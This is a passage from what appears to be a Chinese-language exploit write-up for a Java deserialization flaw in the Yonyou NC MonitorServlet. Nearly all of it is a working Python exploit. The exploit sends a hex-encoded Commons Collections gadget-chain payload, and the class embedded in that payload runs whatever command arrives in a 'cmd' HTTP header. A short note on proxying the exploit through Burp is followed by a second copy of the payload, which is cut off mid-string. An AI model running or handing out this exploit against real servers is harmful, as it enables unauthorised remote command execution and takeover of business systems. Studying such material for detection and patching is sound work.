5\x78\x74\x01\x00\x14\x28\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x01\x00\x13\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x50\x72\x69\x6e\x74\x57\x72\x69\x74\x65\x72\x01\x00\x05\x66\x6c\x75\x73\x68\x01\x00\x05\x63\x6c\x6f\x73\x65\x01\x00\x11\x67\x65\x74\x44\x65\x63\x6c\x61\x72\x65\x64\x46\x69\x65\x6c\x64\x73\x01\x00\x1c\x28\x29\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x46\x69\x65\x6c\x64\x3b\x01\x00\x0d\x73\x65\x74\x41\x63\x63\x65\x73\x73\x69\x62\x6c\x65\x01\x00\x04\x28\x5a\x29\x56\x01\x00\x03\x67\x65\x74\x01\x00\x26\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x01\x00\x07\x69\x73\x41\x72\x72\x61\x79\x01\x00\x03\x28\x29\x5a\x01\x00\x0d\x67\x65\x74\x53\x75\x70\x65\x72\x63\x6c\x61\x73\x73\x00\x21\x00\x2e\x00\x17\x00\x00\x00\x03\x00\x08\x00\x2f\x00\x30\x00\x01\x00\x31\x00\x00\x00\x02\x00\x32\x00\x08\x00\x33\x00\x34\x00\x00\x00\x08\x00\x35\x00\x36\x00\x00\x00\x05\x00\x01\x00\x37\x00\x38\x00\x01\x00\x39\x00\x00\x00\x1d\x00\x01\x00\x01\x00\x00\x00\x05\x2a\xb7\x00\x01\xb1\x00\x00\x00\x01\x00\x3a\x00\x00\x00\x06\x00\x01\x00\x00\x00\x0a\x00\x09\x00\x3b\x00\x3c\x00\x01\x00\x39\x00\x00\x00\x4e\x00\x02\x00\x01\x00\x00\x00\x22\xb2\x00\x02\x12\x03\xb6\x00\x04\x01\xb3\x00\x05\x01\xb3\x00\x06\xbb\x00\x07\x59\xb7\x00\x08\xb3\x00\x09\xb8\x00\x0a\x03\xb8\x00\x0b\xb1\x00\x00\x00\x01\x00\x3a\x00\x00\x00\x1a\x00\x06\x00\x00\x00\x11\x00\x08\x00\x12\x00\x0c\x00\x13\x00\x10\x00\x14\x00\x1a\x00\x15\x00\x21\x00\x16\x00\x0a\x00\x3d\x00\x3e\x00\x01\x00\x39\x00\x00\x00\x48\x00\x02\x00\x01\x00\x00\x00\x1a\x2a\xc6\x00\x0d\xb2\x00\x09\x2a\xb6\x00\x0c\x99\x00\x05\x04\xac\xb2\x00\x09\x2a\xb6\x00\x0d\x57\x03\xac\x00\x00\x00\x02\x00\x3a\x00\x00\x00\x12\x00\x04\x00\x00\x00\x21\x00\x0e\x00\x22\x00\x10\x00\x25\x00\x18\x00\x26\x00\x3f\x00\x00\x00\x04\x00\x02\x0e\x01\x00\x0a\x00\x35\x00\x40\x00\x01\x00\x39\x00\x00\x01\x58\x00\x06\x00\x03\x00\x00\x00\xcb\x1b\x10\x34\xa3\x00\x0f\xb2\x00\x05\xc6\x00\x0a\xb2\x00\x06\xc6\x00\x04\xb1\x2a\xb8\x00\x0e\x9a\x00\xb3\xb2\x00\x05\xc7\x00\x52\x13\x00\x0f\x2a\xb6\x00\x10\xb6\x00\x11\x99\x00\x45\x2a\xc0\x00\x0f\xb3\x00\x05\xb2\x00\x05\x12\x12\xb9\x00\x13\x02\x00\xc7\x00\x0a\x01\xb3\x00\x05\xa7\x00\x2a\xb2\x00\x05\xb6\x00\x10\x12\x14\x03\xbd\x00\x15\xb6\x00\x16\xb2\x00\x05\x03\xbd\x00\x17\xb6\x00\x18\xc0\x00\x19\xb3\x00\x06\xa7\x00\x08\x4d\x01\xb3\x00\x05\xb2\x00\x05\xc6\x00\x51\xb2\x00\x06\xc6\x00\x4b\xb2\x00\x06\xb9\x00\x1b\x01\x00\xbb\x00\x1c\x59\xb8\x00\x1d\xb2\x00\x05\x12\x12\xb9\x00\x13\x02\x00\xb6\x00\x1e\xb6\x00\x1f\xb7\x00\x20\x12\x21\xb6\x00\x22\xb6\x00\x23\xb6\x00\x24\xb2\x00\x06\xb9\x00\x1b\x01\x00\xb6\x00\x25\xb2\x00\x06\xb9\x00\x1b\x01\x00\xb6\x00\x26\xa7\x00\x04\x4d\xb1\x2a\x1b\x04\x60\xb8\x00\x0b\xb1\x00\x02\x00\x48\x00\x67\x00\x6a\x00\x1a\x00\x7b\x00\xbe\x00\xc1\x00\x1a\x00\x02\x00\x3a\x00\x00\x00\x52\x00\x14\x00\x00\x00\x29\x00\x12\x00\x2a\x00\x13\x00\x2c\x00\x1a\x00\x2d\x00\x2d\x00\x2e\x00\x34\x00\x2f\x00\x41\x00\x30\x00\x48\x00\x33\x00\x67\x00\x38\x00\x6a\x00\x36\x00\x6b\x00\x37\x00\x6f\x00\x3c\x00\x7b\x00\x3f\x00\xa8\x00\x40\x00\xb3\x00\x41\x00\xbe\x00\x43\x00\xc1\x00\x42\x00\xc2\x00\x44\x00\xc3\x00\x47\x00\xca\x00\x49\x00\x3f\x00\x00\x00\x13\x00\x09\x12\x00\x34\x61\x07\x00\x41\x04\xf7\x00\x51\x07\x00\x41\x00\x00\x06\x00\x0a\x00\x42\x00\x40\x00\x01\x00\x39\x00\x00\x01\x10\x00\x02\x00\x0c\x00\x00\x00\x84\x2a\xb6\x00\x10\x4d\x2c\xb6\x00\x27\x4e\x2d\xbe\x36\x04\x03\x36\x05\x15\x05\x15\x04\xa2\x00\x65\x2d\x15\x05\x32\x3a\x06\x19\x06\x04\xb6\x00\x28\x01\x3a\x07\x19\x06\x2a\xb6\x00\x29\x3a\x07\x19\x07\xb6\x00\x10\xb6\x00\x2a\x9a\x00\x0c\x19\x07\x1b\xb8\x00\x2b\xa7\x00\x2f\x19\x07\xc0\x00\x2c\xc0\x00\x2c\x3a\x08\x19\x08\xbe\x36\x09\x03\x36\x0a\x15\x0a\x15\x09\xa2\x00\x16\x19\x08\x15\x0a\x32\x3a\x0b\x19\x0b\x1b\xb8\x00\x2b\x84\x0a\x01\xa7\xff\xe9\xa7\x00\x05\x3a\x08\x84\x05\x01\xa7\xff\x9a\x2c\xb6\x00\x2d\x59\x4d\xc7\xff\x85\xb1\x00\x01\x00\x27\x00\x6f\x00\x72\x00\x1a\x00\x02\x00\x3a\x00\x00\x00\x3e\x00\x0f\x00\x00\x00\x4c\x00\x05\x00\x4e\x00\x1e\x00\x4f\x00\x24\x00\x50\x00\x27\x00\x52\x00\x2f\x00\x54\x00\x3a\x00\x55\x00\x43\x00\x57\x00\x63\x00\x58\x00\x69\x00\x57\x00\x6f\x00\x5e\x00\x72\x00\x5d\x00\x74\x00\x4e\x00\x7a\x00\x62\x00\x83\x00\x64\x00\x3f\x00\x00\x00\x2e\x00\x08\xfc\x00\x05\x07\x00\x43\xfe\x00\x0b\x07\x00\x44\x01\x01\xfd\x00\x31\x07\x00\x45\x07\x00\x46\xfe\x00\x11\x07\x00\x2c\x01\x01\xf8\x00\x19\x42\x07\x00\x41\xf9\x00\x01\xf8\x00\x05\x00\x01\x00\x47\x00\x00\x00\x02\x00\x48\x74\x00\x0b\x64\x65\x66\x69\x6e\x65\x43\x6c\x61\x73\x73\x75\x71\x00\x7e\x00\x1a\x00\x00\x00\x02\x76\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\xa0\xf0\xa4\x38\x7a\x3b\xb3\x42\x02\x00\x00\x78\x70\x76\x71\x00\x7e\x00\x28\x73\x71\x00\x7e\x00\x13\x75\x71\x00\x7e\x00\x18\x00\x00\x00\x02\x74\x00\x04\x6d\x61\x69\x6e\x75\x71\x00\x7e\x00\x1a\x00\x00\x00\x01\x76\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00\x78\x70\x74\x00\x09\x67\x65\x74\x4d\x65\x74\x68\x6f\x64\x75\x71\x00\x7e\x00\x1a\x00\x00\x00\x02\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x1e\x73\x71\x00\x7e\x00\x13\x75\x71\x00\x7e\x00\x18\x00\x00\x00\x02\x70\x75\x71\x00\x7e\x00\x18\x00\x00\x00\x01\x70\x74\x00\x06\x69\x6e\x76\x6f\x6b\x65\x75\x71\x00\x7e\x00\x1a\x00\x00\x00\x02\x76\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x78\x70\x71\x00\x7e\x00\x24\x73\x71\x00\x7e\x00\x0f\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x49\x6e\x74\x65\x67\x65\x72\x12\xe2\xa0\xa4\xf7\x81\x87\x38\x02\x00\x01\x49\x00\x05\x76\x61\x6c\x75\x65\x78\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4e\x75\x6d\x62\x65\x72\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00\x78\x70\x00\x00\x00\x01\x73\x71\x00\x7e\x00\x00\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x00\x78\x78\x74\x00\x0a\x76\x61\x6c\x75\x65\x76\x61\x6c\x75\x65\x78"

    uploadHeader={
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
        "cmd": cmd
        }
        
    req = requests.post(url + "/servlet/~ic/nc.bs.framework.mx.monitor.MonitorServlet", headers=uploadHeader, verify=False, data=data, timeout=60)
    # req = requests.post(url + "/servlet/monitorservlet", headers=uploadHeader, verify=False, data=data)

    print ("\n\033[1;37;43mreq.headers:\033[0m")
    print (req.headers)

    print ("\n\033[1;37;43mreq.text:\033[0m")
    print (req.text)

    print ("\n\033[1;37;43mreq.status_code:\033[0m")
    print (req.status_code)


if __name__ == '__main__':
    exp(url=sys.argv[1], cmd=sys.argv[2])
```

<div align=center><img src="https://user-images.githubusercontent.com/84888757/205454259-6ec96a13-d2d3-4fed-9dd9-406baf83ecb6.png" /></div>

直接用 `burp` 发送序列化数据会报错，在代码里添加个 `proxies` 转发一下才行，改两行代码的事情：

```python
import requests
import urllib3
import sys
import base64

proxies = {
    "http": "http://127.0.0.1:8080",
    # "https": "http://127.0.0.1:8080"
}

def exp(url, cmd):
    data = "\xac\xed\x00\x05\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x01\x73\x72\x00\x34\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x6b\x65\x79\x76\x61\x6c\x75\x65\x2e\x54\x69\x65\x64\x4d\x61\x70\x45\x6e\x74\x72\x79\x8a\xad\xd2\x9b\x39\xc1\x1f\xdb\x02\x00\x02\x4c\x00\x03\x6b\x65\x79\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x4c\x00\x03\x6d\x61\x70\x74\x00\x0f\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4d\x61\x70\x3b\x78\x70\x74\x00\x06\x6b\x65\x79\x6b\x65\x79\x73\x72\x00\x2a\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x6d\x61\x70\x2e\x4c\x61\x7a\x79\x4d\x61\x70\x6e\xe5\x94\x82\x9e\x79\x10\x94\x03\x00\x01\x4c\x00\x07\x66\x61\x63\x74\x6f\x72\x79\x74\x00\x2c\x4c\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x63\x6f\x6d\x6d\x6f\x6e\x73\x2f\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2f\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x3b\x78\x70\x73\x72\x00\x3a\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x66\x75\x6e\x63\x74\x6f\x72\x73\x2e\x43\x68\x61\x69\x6e\x65\x64\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x30\xc7\x97\xec\x28\x7a\x97\x04\x02\x00\x01\x5b\x00\x0d\x69\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x73\x74\x00\x2d\x5b\x4c\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x63\x6f\x6d\x6d\x6f\x6e\x73\x2f\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2f\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x3b\x78\x70\x75\x72\x00\x2d\x5b\x4c\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x3b\xbd\x56\x2a\xf1\xd8\x34\x18\x99\x02\x00\x00\x78\x70\x00\x00\x00\x07\x73\x72\x00\x3b\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x66\x75\x6e\x63\x74\x6f\x72\x73\x2e\x43\x6f\x6e\x73\x74\x61\x6e\x74\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x58\x76\x90\x11\x41\x02\xb1\x94\x02\x00\x01\x4c\x00\x09\x69\x43\x6f\x6e\x73\x74\x61\x6e\x74\x71\x00\x7e\x00\x03\x78\x70\x76\x72\x00\x2a\x6f\x72\x67\x2e\x6d\x6f\x7a\x69\x6c\x6c\x61\x2e\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x2e\x44\x65\x66\x69\x6e\x69\x6e\x67\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x78\x70\x73\x72\x00\x3a\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x66\x75\x6e\x63\x74\x6f\x72\x73\x2e\x49\x6e\x76\x6f\x6b\x65\x72\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x87\xe8\xff\x6b\x7b\x7c\xce\x38\x02\x00\x03\x5b\x00\x05\x69\x41\x72\x67\x73\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x4c\x00\x0b\x69\x4d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x0b\x69\x50\x61\x72\x61\x6d\x54\x79\x70\x65\x73\x74\x00\x12\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x78\x70\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58\x9f\x10\x73\x29\x6c\x02\x00\x00\x78\x70\x00\x00\x00\x01\x75\x72\x00\x12\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x43\x6c\x61\x73\x73\x3b\xab\x16\xd7\xae\xcb\xcd\x5a\x99\x02\x00\x00\x78\x70\x00\x00\x00\x00\x74\x00\x16\x67\x65\x74\x44\x65\x63\x6c\x61\x72\x65\x64\x43\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x75\x71\x00\x7e\x00\x1a\x00\x00\x00\x01\x76\x71\x00\x7e\x00\x1a\x73\x71\x00\x7e\x00\x13\x75\x71\x00\x7e\x00\x18\x00\x00\x00\x01\x75\x71\x00\x7e\x00\x18\x00\x00\x00\x00\x74\x00\x0b\x6e\x65\x77\x49\x6e\x73\x74\x61\x6e\x63\x65\x75\x71\x00\x7e\x00\x1a\x00\x00\x00\x01\x76\x71\x00\x7e\x00\x18\x73\x71\x00\x7e\x00\x13\x75\x71\x00\x7e\x00\x18\x00\x00\x00\x02\x74\x00\x13\x6f\x72\x67\x2e\x76\x75\x6c\x68\x75\x62\x2e\x6e\x63\x36\x35\x2e\x64\x66\x73\x75\x72\x00\x02\x5b\x42\xac\xf3\x17\xf8\x06\x08\x54\xe0\x02\x00\x00\x78\x70\x00\x00\x0b\x9f\xca\xfe\xba\xbe\x00\x00\x00\x33\x00\xb0\x0a\x00\x17\x00\x49\x09\x00\x4a\x00\x4b\x08\x00\x4c\x0a\x00\x4d\x00\x4e\x09\x00\x2e\x00\x4f\x09\x00\x2e\x00\x50\x07\x00\x51\x0a\x00\x07\x00\x49\x09\x00\x2e\x00\x52\x0a\x00\x53\x00\x54\x0a\x00\x2e\x00\x55\x0a\x00\x07\x00\x56\x0a\x00\x07\x00\x57\x0a\x00\x2e\x00\x58\x07\x00\x59\x0a\x00\x17\x00\x5a\x0a\x00\x15\x00\x5b\x08\x00\x5c\x0b\x00\x0f\x00\x5d\x08\x00\x5e\x07\x00\x5f\x0a\x00\x15\x00\x60\x07\x00\x61\x0a\x00\x62\x00\x63\x07\x00\x64\x07\x00\x65\x0b\x00\x19\x00\x66\x07\x00\x67\x0a\x00\x68\x00\x69\x0a\x00\x68\x00\x6a\x0a\x00\x6b\x00\x6c\x0a\x00\x1c\x00\x6d\x08\x00\x6e\x0a\x00\x1c\x00\x6f\x0a\x00\x1c\x00\x70\x0a\x00\x71\x00\x4e\x0a\x00\x71\x00\x72\x0a\x00\x71\x00\x73\x0a\x00\x15\x00\x74\x0a\x00\x75\x00\x76\x0a\x00\x75\x00\x77\x0a\x00\x15\x00\x78\x0a\x00\x2e\x00\x79\x07\x00\x7a\x0a\x00\x15\x00\x7b\x07\x00\x7c\x01\x00\x01\x68\x01\x00\x13\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x48\x61\x73\x68\x53\x65\x74\x3b\x01\x00\x09\x53\x69\x67\x6e\x61\x74\x75\x72\x65\x01\x00\x27\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x48\x61\x73\x68\x53\x65\x74\x3c\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x3e\x3b\x01\x00\x01\x72\x01\x00\x27\x4c\x6a\x61\x76\x61\x78\x2f\x73\x65\x72\x76\x6c\x65\x74\x2f\x68\x74\x74\x70\x2f\x48\x74\x74\x70\x53\x65\x72\x76\x6c\x65\x74\x52\x65\x71\x75\x65\x73\x74\x3b\x01\x00\x01\x70\x01\x00\x28\x4c\x6a\x61\x76\x61\x78\x2f\x73\x65\x72\x76\x6c\x65\x74\x2f\x68\x74\x74\x70\x2f\x48\x74\x74\x70\x53\x65\x72\x76\x6c\x65\x74\x52\x65\x73\x70\x6f\x6e\x73\x65\x3b\x01\x00\x06\x3c\x69\x6e\x69\x74\x3e\x01\x00\x03\x28\x29\x56\x01\x00\x04\x43\x6f\x64\x65\x01\x00\x0f\x4c\x69\x6e\x65\x4e\x75\x6d\x62\x65\x72\x54\x61\x62\x6c\x65\x01\x00\x04\x6d\x61\x69\x6e\x01\x00\x16\x28\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x56\x01\x00\x01\x69\x01\x00\x15\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x29\x5a\x01\x00\x0d\x53\x74\x61\x63\x6b\x4d\x61\x70\x54\x61\x62\x6c\x65\x01\x00\x16\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x49\x29\x56\x07\x00\x65\x01\x00\x01\x46\x07\x00\x5f\x07\x00\x7d\x07\x00\x7e\x07\x00\x61\x01\x00\x0a\x53\x6f\x75\x72\x63\x65\x46\x69\x6c\x65\x01\x00\x08\x64\x66\x73\x2e\x6a\x61\x76\x61\x0c\x00\x37\x00\x38\x07\x00\x7f\x0c\x00\x80\x00\x81\x01\x00\x04\x66\x75\x63\x6b\x07\x00\x82\x0c\x00\x83\x00\x84\x0c\x00\x33\x00\x34\x0c\x00\x35\x00\x36\x01\x00\x11\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x48\x61\x73\x68\x53\x65\x74\x0c\x00\x2f\x00\x30\x07\x00\x85\x0c\x00\x86\x00\x87\x0c\x00\x42\x00\x40\x0c\x00\x88\x00\x3e\x0c\x00\x89\x00\x3e\x0c\x00\x3d\x00\x3e\x01\x00\x25\x6a\x61\x76\x61\x78\x2f\x73\x65\x72\x76\x6c\x65\x74\x2f\x68\x74\x74\x70\x2f\x48\x74\x74\x70\x53\x65\x72\x76\x6c\x65\x74\x52\x65\x71\x75\x65\x73\x74\x0c\x00\x8a\x00\x8b\x0c\x00\x8c\x00\x8d\x01\x00\x03\x63\x6d\x64\x0c\x00\x8e\x00\x8f\x01\x00\x0b\x67\x65\x74\x52\x65\x73\x70\x6f\x6e\x73\x65\x01\x00\x0f\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x0c\x00\x90\x00\x91\x01\x00\x10\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x07\x00\x92\x0c\x00\x93\x00\x94\x01\x00\x26\x6a\x61\x76\x61\x78\x2f\x73\x65\x72\x76\x6c\x65\x74\x2f\x68\x74\x74\x70\x2f\x48\x74\x74\x70\x53\x65\x72\x76\x6c\x65\x74\x52\x65\x73\x70\x6f\x6e\x73\x65\x01\x00\x13\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x0c\x00\x95\x00\x96\x01\x00\x11\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x53\x63\x61\x6e\x6e\x65\x72\x07\x00\x97\x0c\x00\x98\x00\x99\x0c\x00\x9a\x00\x9b\x07\x00\x9c\x0c\x00\x9d\x00\x9e\x0c\x00\x37\x00\x9f\x01\x00\x02\x5c\x41\x0c\x00\xa0\x00\xa1\x0c\x00\xa2\x00\xa3\x07\x00\xa4\x0c\x00\xa5\x00\x38\x0c\x00\xa6\x00\x38\x0c\x00\xa7\x00\xa8\x07\x00\x7e\x0c\x00\xa9\x00\xaa\x0c\x00\xab\x00\xac\x0c\x00\xad\x00\xae\x0c\x00\x35\x00\x40\x01\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x0c\x00\xaf\x00\x8b\x01\x00\x13\x6f\x72\x67\x2f\x76\x75\x6c\x68\x75\x62\x2f\x6e\x63\x36\x35\x2f\x64\x66\x73\x01\x00\x1a\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x46\x69\x65\x6c\x64\x3b\x01\x00\x17\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x46\x69\x65\x6c\x64\x01\x00\x10\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x79\x73\x74\x65\x6d\x01\x00\x03\x6f\x75\x74\x01\x00\x15\x4c\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x50\x72\x69\x6e\x74\x53\x74\x72\x65\x61\x6d\x3b\x01\x00\x13\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x50\x72\x69\x6e\x74\x53\x74\x72\x65\x61\x6d\x01\x00\x07\x70\x72\x69\x6e\x74\x6c\x6e\x01\x00\x15\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x56\x01\x00\x10\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x54\x68\x72\x65\x61\x64\x01\x00\x0d\x63\x75\x72\x72\x65\x6e\x74\x54\x68\x72\x65\x61\x64\x01\x00\x14\x28\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x54\x68\x72\x65\x61\x64\x3b\x01\x00\x08\x63\x6f\x6e\x74\x61\x69\x6e\x73\x01\x00\x03\x61\x64\x64\x01\x00\x08\x67\x65\x74\x43\x6c\x61\x73\x73\x01\x00\x13\x28\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x01\x00\x10\x69\x73\x41\x73\x73\x69\x67\x6e\x61\x62\x6c\x65\x46\x72\x6f\x6d\x01\x00\x14\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x29\x5a\x01\x00\x09\x67\x65\x74\x48\x65\x61\x64\x65\x72\x01\x00\x26\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x01\x00\x09\x67\x65\x74\x4d\x65\x74\x68\x6f\x64\x01\x00\x40\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x4d\x65\x74\x68\x6f\x64\x3b\x01\x00\x18\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x4d\x65\x74\x68\x6f\x64\x01\x00\x06\x69\x6e\x76\x6f\x6b\x65\x01\x00\x39\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x01\x00\x09\x67\x65\x74\x57\x72\x69\x74\x65\x72\x01\x00\x17\x28\x29\x4c\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x50\x72\x69\x6e\x74\x57\x72\x69\x74\x65\x72\x3b\x01\x00\x11\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x52\x75\x6e\x74\x69\x6d\x65\x01\x00\x0a\x67\x65\x74\x52\x75\x6e\x74\x69\x6d\x65\x01\x00\x15\x28\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x52\x75\x6e\x74\x69\x6d\x65\x3b\x01\x00\x04\x65\x78\x65\x63\x01\x00\x27\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x50\x72\x6f\x63\x65\x73\x73\x3b\x01\x00\x11\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x50\x72\x6f\x63\x65\x73\x73\x01\x00\x0e\x67\x65\x74\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x01\x00\x17\x28\x29\x4c\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x3b\x01\x00\x18\x28\x4c\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x3b\x29\x56\x01\x00\